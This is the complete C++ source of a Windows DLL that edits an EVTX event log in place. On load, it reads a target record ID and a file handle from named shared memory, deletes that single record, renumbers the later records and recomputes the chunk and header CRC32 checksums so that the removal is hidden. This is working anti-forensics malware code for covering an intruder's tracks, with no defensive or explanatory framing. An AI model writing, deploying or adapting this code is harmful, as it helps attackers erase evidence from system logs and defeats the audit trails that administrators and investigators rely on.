#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <tchar.h>
#pragma comment(lib,"Advapi32.lib")
#define BUF_SIZE 256

#define SUCCESSED 0
#define FAILURE 1
#pragma pack(1)
typedef struct _ELFFILE_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstChunkNumber;
	ULONG64 LastChunkNumber;
	ULONG64 NextRecordIdentifier;
	ULONG HeaderSize;
	WORD MinorVersion;
	WORD MajorVersion;
	WORD ChunkDataOffset;
	ULONG NumberOfChunks;
	UCHAR Unknown[74];
	ULONG FileFlags;
	ULONG Checksum;
} ELFFILE_HEADER, *PELFFILE_HEADER;

typedef struct _CHUNK_HEADER
{
	ULONG64 Signature;
	ULONG64 FirstEventRecordNumber;
	ULONG64 LastEventRecordNumber;
	ULONG64 FirstEventRecorIdentifier;
	ULONG64 LastEventRecordIdentifier;
	ULONG HeaderSize;
	ULONG LastEventRecordDataOffset;
	ULONG FreeSpaceOffset;
	ULONG EventRecordsChunksum;
	UCHAR Unknown1[64];
	ULONG Unknown2;
	ULONG Checksum;
} CHUNK_HEADER, *PCHUNK_HEADER;

typedef struct _EVENT_RECORD
{
	ULONG Signature;
	ULONG Size;
	ULONG64 EventRecordIdentifier;
	ULONG64 WrittenDateAndTime;
} EVENT_RECORD, *PEVENT_RECORD;
#pragma pack()

unsigned int CRC32[256];

static void init_table()
{
	int i, j;
	unsigned int crc;
	for (i = 0; i < 256; i++)
	{
		crc = i;
		for (j = 0; j < 8; j++)
		{
			if (crc & 1)
			{
				crc = (crc >> 1) ^ 0xEDB88320;
			}
			else
			{
				crc = crc >> 1;
			}
		}
		CRC32[i] = crc;
	}
}

unsigned int GetCRC32(unsigned char *buf, int len)
{
	unsigned int ret = 0xFFFFFFFF;
	int i;
	static char init = 0;
	if (!init)
	{
		init_table();
		init = 1;
	}
	for (i = 0; i < len; i++)
	{
		ret = CRC32[((ret & 0xFF) ^ buf[i])] ^ (ret >> 8);
	}
	ret = ~ret;

	return ret;
}

PVOID GetTemplateIdentifierPtr(PBYTE chunkPtr, PBYTE recordPtr, PULONG a3)
{
	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)xmlDataPtr)
		{
			while (0x0b == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}

		PBYTE templateInstance = NULL;
		if (0x0c == *(xmlDataPtr + 4))
			templateInstance = xmlDataPtr + 4;
		if (templateInstance)
		{
			PBYTE v8 = NULL;

			if ((ULONG_PTR)templateInstance - (ULONG_PTR)chunkPtr + 10 ==
				*(PULONG)(templateInstance + 6))
			{
				v8 = templateInstance + 14;
			}
			else
			{
				ULONG templateDefinitionOffset = *(PULONG)(templateInstance + 6);
				ULONG tmp = (ULONG)(recordPtr - chunkPtr);
				if (templateDefinitionOffset < tmp || templateDefinitionOffset > tmp + *(PULONG)(recordPtr + 4))
					goto LABEL;
				v8 = templateDefinitionOffset + chunkPtr + 4;
			}
			if (v8)
			{
				if (*(PULONG)v8 == *(PULONG)(templateInstance + 2))
				{
					ULONG tmp = *(PULONG)(v8 + 16);
					*a3 = *(PULONG)(tmp + v8 + 20);
					return tmp + v8 + 24;
				}
				return NULL;
			}
		LABEL:
			*a3 = *(PULONG)(templateInstance + 10);
			return templateInstance + 14;
		}
	}

	return NULL;
}

PVOID ModifyRecordNumber(PBYTE chunkPtr, PEVENT_RECORD recordPtr, ULONG64 eventRecordIdentifier)
{
	ULONG v9 = 0;
	PWORD templateIdentifierPtr = (PWORD)GetTemplateIdentifierPtr(chunkPtr, (PBYTE)recordPtr, &v9);

	if (templateIdentifierPtr)
	{
		ULONG count = 10;
		PULONG64 v7 = (PULONG64)&templateIdentifierPtr[2 * v9];

		do
		{
			WORD v8 = *templateIdentifierPtr;
			templateIdentifierPtr += 2;
			v7 = (PULONG64)((PBYTE)v7 + v8);
			--count;
		} while (count);
		*v7 = eventRecordIdentifier;
		recordPtr->EventRecordIdentifier = eventRecordIdentifier;
	}

	return templateIdentifierPtr;
}

PVOID GetTemplateInstancePtr(PBYTE recordPtr)
{
	PBYTE result = NULL;

	if (recordPtr)
	{
		PBYTE xmlDataPtr = recordPtr + 24;

		if (0x1010f != *(PULONG)(recordPtr + 24))
		{
			while (0xb == *xmlDataPtr)
				xmlDataPtr += 2 * *(PWORD)(xmlDataPtr + 1) + 3;
		}
		if (0x0c == *(xmlDataPtr + 4))
			result = xmlDataPtr + 4;
	}
	return result;
}

PVOID GetTemplateDefinition(PBYTE chunkPtr, PEVENT_RECORD recordPtr, PBYTE templateInstancePtr)
{
	PBYTE result = NULL;
	do
	{
		if (!recordPtr || !templateInstancePtr)
			break;
		if ((ULONG_PTR)templateInstancePtr - (ULONG_PTR)chunkPtr + 10 ==
			*(PULONG)(templateInstancePtr + 6))
			return templateInstancePtr + 14;

		ULONG templateDefinitionOffset = *(PULONG)(templateInstancePtr + 6);
		ULONG64 v6 = (ULONG64)((PBYTE)recordPtr - chunkPtr);
		if ((templateDefinitionOffset >= v6) &&
			(templateDefinitionOffset <= v6 + recordPtr->Size))
			result = templateDefinitionOffset + chunkPtr + 4;
	} while (FALSE);

	return result;
}

ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
{
	ULONG result = FAILURE;
	PELFFILE_HEADER elfFilePtr = (PELFFILE_HEADER)mapAddress;
	do
	{
		if (memcmp(mapAddress, "ElfFile", 8))
			break;
		ULONG crc32 = 0;
		BOOL unknownFlag = FALSE;
		BOOL deleted = FALSE;
		BOOL isSingleRecord = FALSE;
		ULONG64 chunkTotal = 0;
		ULONG64 chunkCount = 0;
		ULONG64 firstChunkNumber = elfFilePtr->FirstChunkNumber;
		ULONG64 lastChunkNumber = elfFilePtr->LastChunkNumber;
		ULONG numberOfChunk = elfFilePtr->NumberOfChunks;

		if (firstChunkNumber >= 0xffffffff || lastChunkNumber >= 0xffffffff)
			break;
		if (lastChunkNumber >= firstChunkNumber)
			chunkTotal = lastChunkNumber - firstChunkNumber + 1;
		else
			chunkTotal = lastChunkNumber + numberOfChunk - firstChunkNumber;

		while (chunkCount < chunkTotal)
		{
			ULONG64 chunkOffset = firstChunkNumber + chunkCount;
			if (chunkOffset > numberOfChunk)
				chunkOffset = chunkOffset - numberOfChunk;
			chunkOffset <<= 16;
			PCHUNK_HEADER currentChunk = (PCHUNK_HEADER)(chunkOffset + (PBYTE)elfFilePtr + 0x1000);
			if (0xffffffffffffffff != currentChunk->LastEventRecordIdentifier)
			{
				PEVENT_RECORD prevRecordPtr = NULL;
				PEVENT_RECORD currentRecordPtr = NULL;
				PEVENT_RECORD nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentChunk + 0x200);
				while (nextRecordPtr)
				{
					prevRecordPtr = currentRecordPtr;
					currentRecordPtr = nextRecordPtr;
					nextRecordPtr = (PEVENT_RECORD)((PBYTE)nextRecordPtr + nextRecordPtr->Size);

					if (0x00002a2a != currentRecordPtr->Signature)
						break;
					ULONG64 eventRecordIdentifier = currentRecordPtr->EventRecordIdentifier;
					if ((eventRecordIdentifier >= currentChunk->LastEventRecordIdentifier) ||
						(currentRecordPtr == nextRecordPtr))
						nextRecordPtr = NULL;
					if (eventRecordIdentifier >= recordNumber)
					{
						if (eventRecordIdentifier > recordNumber || deleted)
						{
							if (deleted)
							{
								ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, eventRecordIdentifier - 1);
							}
						}
						else
						{
							if (!nextRecordPtr && !prevRecordPtr)
							{
								currentChunk->FirstEventRecordNumber = 1;
								currentChunk->LastEventRecordNumber = 0xffffffffffffffff;
								currentChunk->FirstEventRecorIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordIdentifier = 0xffffffffffffffff;
								currentChunk->LastEventRecordDataOffset = 0;
								currentChunk->FreeSpaceOffset = 512;
								memset((PBYTE)currentChunk + 128, 0, 0x180);
								isSingleRecord = TRUE;
								deleted = TRUE;
								result = SUCCESSED;
								break;
							}
							if (prevRecordPtr)
							{
								ULONG TempprevRecordPtrSize = prevRecordPtr->Size;
								prevRecordPtr->Size += currentRecordPtr->Size;
								*(PULONG)(prevRecordPtr->Size + (PBYTE)prevRecordPtr - 4) = prevRecordPtr->Size;
								memset(currentRecordPtr, 0, currentRecordPtr->Size - 4);
								deleted = TRUE;
								result = SUCCESSED;
								currentRecordPtr = prevRecordPtr;
								if (currentChunk->LastEventRecordIdentifier == recordNumber)
								{
									currentChunk->LastEventRecordDataOffset = currentChunk->LastEventRecordDataOffset - TempprevRecordPtrSize;
								}
							}
							else
							{
								PBYTE xmlDataPtr = (PBYTE)currentRecordPtr + 24;
								PBYTE currentRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)currentRecordPtr);
								PBYTE nextRecordTemplateInstancePtr = (PBYTE)GetTemplateInstancePtr((PBYTE)nextRecordPtr);
								*(PULONG)xmlDataPtr = 0x1010f;
								*(PWORD)(xmlDataPtr + 4) = 0x10c;
								if (currentRecordTemplateInstancePtr)
								{
									if (nextRecordPtr)
									{
										ULONG a3 = 0;
										PBYTE templateIdentifierPtr = (PBYTE)GetTemplateIdentifierPtr((PBYTE)currentChunk, (PBYTE)nextRecordPtr, &a3);
										if (templateIdentifierPtr)
										{
											PBYTE templateDefinition = (PBYTE)GetTemplateDefinition((PBYTE)currentChunk, currentRecordPtr, currentRecordTemplateInstancePtr);
											*(PULONG)(templateDefinition + 16) = templateIdentifierPtr - templateDefinition - 24;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											deleted = TRUE;
											result = SUCCESSED;
										}
										else
										{
											ModifyRecordNumber((PBYTE)currentChunk, currentRecordPtr, recordNumber);
											ModifyRecordNumber((PBYTE)currentChunk, nextRecordPtr, recordNumber);
											currentRecordPtr->WrittenDateAndTime = nextRecordPtr->WrittenDateAndTime;
											*(PULONG64)(currentRecordTemplateInstancePtr + 10) = *(PULONG)(nextRecordTemplateInstancePtr + 10);
											*xmlDataPtr = 11;
											*(PWORD)(xmlDataPtr + 1) = 0;
											*(xmlDataPtr + 3) = 11;
											*(PWORD)(xmlDataPtr + 4) = ((ULONG64)(ULONG)((PBYTE)nextRecordPtr - (PBYTE)currentRecordPtr) - 6) >> 1;
											currentRecordPtr->Size += nextRecordPtr->Size;
											*(PULONG)(currentRecordPtr->Size + (PBYTE)currentRecordPtr - 4) = currentRecordPtr->Size;
											deleted = TRUE;
											result = SUCCESSED;
										}
										nextRecordPtr = (PEVENT_RECORD)((PBYTE)currentRecordPtr + currentRecordPtr->Size);
									}
								}
							}
						}
					}
				}
				if (deleted)
				{
					ULONG64 lastEventRecordNumber = currentChunk->LastEventRecordNumber;
					ULONG64 lastEventRecordIdentifier = currentChunk->LastEventRecordIdentifier;
					if (0xffffffffffffffff != lastEventRecordNumber || 0xffffffffffffffff != lastEventRecordIdentifier)
					{
						ULONG64 firstEventRecordIdentifier = currentChunk->FirstEventRecorIdentifier;
						if (firstEventRecordIdentifier <= recordNumber && lastEventRecordIdentifier >= recordNumber)
						{
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->LastEventRecordIdentifier = lastEventRecordIdentifier - 1;
						}
						else
						{
							currentChunk->FirstEventRecordNumber -= 1;
							currentChunk->LastEventRecordNumber = lastEventRecordNumber - 1;
							currentChunk->FirstEventRecorIdentifier = firstEventRecordIdentifier - 1;
							currentChunk->LastEventRecordIdentifier -= 1;
						}
					}
				}
				unsigned char *ChecksumBuf1 = new unsigned char[currentChunk->FreeSpaceOffset - 512];
				memcpy(ChecksumBuf1, (PBYTE)currentChunk + 512, currentChunk->FreeSpaceOffset - 512);
				crc32 = GetCRC32(ChecksumBuf1, currentChunk->FreeSpaceOffset - 512);
				if (crc32)
					currentChunk->EventRecordsChunksum = crc32;
				else
					unknownFlag = TRUE;
				unsigned char *ChecksumBuf2 = new unsigned char[504];
				memcpy(ChecksumBuf2, (PBYTE)currentChunk, 120);
				memcpy(ChecksumBuf2 + 120, (PBYTE)currentChunk + 128, 384);
				crc32 = GetCRC32(ChecksumBuf2, 504);
				currentChunk->Checksum = crc32;
			}
			chunkCount++;
		}
		if (isSingleRecord)
		{
			ULONG count = 0;
			while (count < chunkTotal)
			{
				PCHUNK_HEADER currentChunkPtr = NULL;
				PCHUNK_HEADER nextChunkPtr = NULL;
				ULONG64 tmp = firstChunkNumber + count;
				if (tmp > numberOfChunk)
					tmp -= numberOfChunk;
				currentChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				if (++count < chunkTotal)
				{
					tmp = firstChunkNumber + count;
					if (tmp > numberOfChunk)
						tmp -= numberOfChunk;
					nextChunkPtr = (PCHUNK_HEADER)((tmp << 16) + (PBYTE)elfFilePtr + 0x1000);
				}
				if (0xffffffffffffffff == currentChunkPtr->LastEventRecordNumber && 0xffffffffffffffff == currentChunkPtr->LastEventRecordIdentifier)
				{
					if (nextChunkPtr)
					{
						memcpy(currentChunkPtr, nextChunkPtr, 0x10000);
						nextChunkPtr->FirstEventRecordNumber = 1;
						nextChunkPtr->LastEventRecordNumber = 0xffffffffffffffff;
						nextChunkPtr->FirstEventRecorIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordIdentifier = 0xffffffffffffffff;
						nextChunkPtr->LastEventRecordDataOffset = 0;
						nextChunkPtr->FreeSpaceOffset = 512;
						memset((PBYTE)nextChunkPtr + 128, 0, 0x180);
					}
					else
					{
						if (lastChunkNumber)
							elfFilePtr->LastChunkNumber = lastChunkNumber - 1;
						else
							elfFilePtr->LastChunkNumber = numberOfChunk - 1;
					}
				}
			}
		}
		if (deleted)
			elfFilePtr->NextRecordIdentifier -= 1;
		crc32 = 0;
		unsigned char *ChecksumBuf3 = new unsigned char[120];
		memcpy(ChecksumBuf3, (PBYTE)elfFilePtr, 120);
		crc32 = GetCRC32(ChecksumBuf3, 120);
		elfFilePtr->Checksum = crc32;
		if (!unknownFlag)
			*(PULONG)((PBYTE)elfFilePtr + 118) &= 0xfffffffe;
	} while (FALSE);
	return result;
}

BOOL WINAPI DllMain(HMODULE instance, DWORD reason, PVOID reserve)
{
	ULONG result = FAILURE;
	PVOID mapAddress = NULL;
	HANDLE mapHandle = NULL;
	HANDLE fileHandle = NULL;
	DWORD EventRecordID = 0;
	HANDLE hMapFile1, hMapFile2;
	char *pBuf1;
	char *pBuf2;
	TCHAR szName1[] = L"Global\\SharedMappingObject1";
	TCHAR szName2[] = L"Global\\SharedMappingObject2";
	int offset = 0;
	switch (reason)
	{
	case DLL_PROCESS_ATTACH:
		hMapFile1 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName1);
		if (hMapFile1 == NULL)
			return 1;
		pBuf1 = (char *)MapViewOfFile(hMapFile1, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
		if (pBuf1 == NULL)
		{
			CloseHandle(hMapFile1);
			return 1;
		}
		sscanf_s(pBuf1, "%d", &EventRecordID);
		UnmapViewOfFile(pBuf1);
		CloseHandle(hMapFile1);

		hMapFile2 = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, szName2);
		if (hMapFile2 == NULL)
			return 1;
		pBuf2 = (char *)MapViewOfFile(hMapFile2, FILE_MAP_ALL_ACCESS, 0, 0, BUF_SIZE);
		if (pBuf2 == NULL)
		{
			CloseHandle(hMapFile2);
			return 1;
		}
		sscanf_s(pBuf2, "%d", &offset);
		UnmapViewOfFile(pBuf2);
		CloseHandle(hMapFile2);

		fileHandle = (void*)offset;
		mapHandle = CreateFileMapping(fileHandle, NULL, PAGE_READWRITE, 0, 0, NULL);
		if (!mapHandle)
		{
			break;
		}
		mapAddress = MapViewOfFile(mapHandle, FILE_MAP_ALL_ACCESS, 0, 0, 0);
		if (!mapAddress)
		{
			break;
		}
		result = DeleteRecord(mapAddress, EventRecordID);
		FlushViewOfFile(mapAddress, 0);
		if (mapAddress)
			UnmapViewOfFile(mapAddress);
		if (mapHandle)
			CloseHandle(mapHandle);

		break;
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}
